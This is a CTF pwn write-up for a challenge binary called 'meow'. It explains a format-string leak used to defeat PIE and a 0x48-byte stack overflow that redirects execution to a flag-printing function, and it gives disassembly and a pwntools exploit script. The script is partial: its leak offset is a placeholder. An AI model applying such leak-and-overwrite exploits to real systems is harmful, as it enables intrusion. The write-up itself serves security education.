## Meow - pwn

>## Description
>The program offers two ways to interact with it: one prints user input as a format string, and the other reads too much data into a stack buffer. Use the format string to leak a code address, then overwrite the return address to reach the function that reads `flag.txt`.

---

>## Initial Analysis

We're given a 64-bit ELF binary named `meow`:

```
meow: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
```

The binary contains a format string vulnerability in menu option 1 and a stack buffer overflow in menu option 2. The function `meow()` opens `flag.txt`, prints its contents, and exits. The binary is PIE-enabled, so we first need a pointer leak to calculate the runtime address of `meow()`.

### Protections

```
Arch:       amd64
PIE:        Enabled
Canary:     Not present (no stack-check reference in the binary)
NX:         Enabled
RELRO:     Partial (GNU_RELRO segment; GOT remains writable)
Stripped:   No
```

The vulnerable menu function is `mi_miauw()`. For option 1, it reads input into a stack buffer and passes that buffer directly to `printf`, allowing positional format specifiers such as `%42$p` to disclose stack values. For option 2, it calls `fgets` with a size of `0x100` on a `0x40`-byte buffer.

```asm
; mi_miauw(): option 1, format string bug
lea    rax, [rbp-0x40]
mov    esi, 0x40
call   fgets@plt
lea    rax, [rbp-0x40]
mov    rdi, rax
call   printf@plt

; mi_miauw(): option 2, stack overflow
lea    rax, [rbp-0x40]
mov    esi, 0x100
call   fgets@plt

; meow(): opens flag.txt, prints its contents, and exits
```

>## Solution

First use option 1 to leak a pointer into the PIE binary. The helper script tries `%42$p`; identify which code address the target prints, then subtract that address's offset in the ELF to calculate the PIE base.

The overflow buffer starts at `[rbp-0x40]`, and the saved RIP is at `[rbp+8]`. This gives an offset of `0x48` bytes to the saved return address. Add the runtime address of `meow()` after the padding:

```text
offset to saved RIP = 0x40 + 8 = 0x48 bytes
runtime meow address = PIE base + meow symbol offset
```

The payload is:

```python
payload = b"A" * 0x48 + p64(runtime_meow)
```

>### Exploit

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./meow", checksec=False)
context.binary = elf

def conn():
    if args.LOCAL:
        return process([elf.path])
    return remote("chall-ctf.ara-its.id", 8576)

def main():
    p = conn()

    # Leak a PIE code pointer with option 1.
    p.sendlineafter(b"meow meow meow ^^: ", b"1")
    p.sendlineafter(b"Kasih Mize sesuatu buat diintip: ", b"%42$p")

    # Replace CODE_POINTER_OFFSET with the ELF offset corresponding to the
    # leaked return address. A return address may point inside main, not at
    # the beginning of the function.
    leak = int(p.recvline().strip(), 16)
    pie_base = leak - CODE_POINTER_OFFSET
    runtime_meow = pie_base + elf.symbols["meow"]

    # Return to the menu and choose option 2 for the overflow.
    p.sendlineafter(b"meow meow meow ^^: ", b"2")
    p.sendlineafter(b"Meow meow RAWRRRRR! (Mize masih lapar, RUAAAAA!!!!)\n", b"A" * 0x48 + p64(runtime_meow))
    p.interactive()

if __name__ == "__main__":
    main()
```

The leak position and the exact code offset represented by `%42$p` should be confirmed against the challenge instance. Once identified, set `CODE_POINTER_OFFSET` to that offset. The current `exploit_meow.py` does not yet implement this flow correctly: it assumes a leak is printed immediately, uses an offset of `0x98`, and targets `mi_miauw`.

The challenge ended some time ago, and I only got around to writing this writeup now. The server no longer returns the flag.

>### Flag
ARA{th3_ch4ll3nge_1s__3nded}
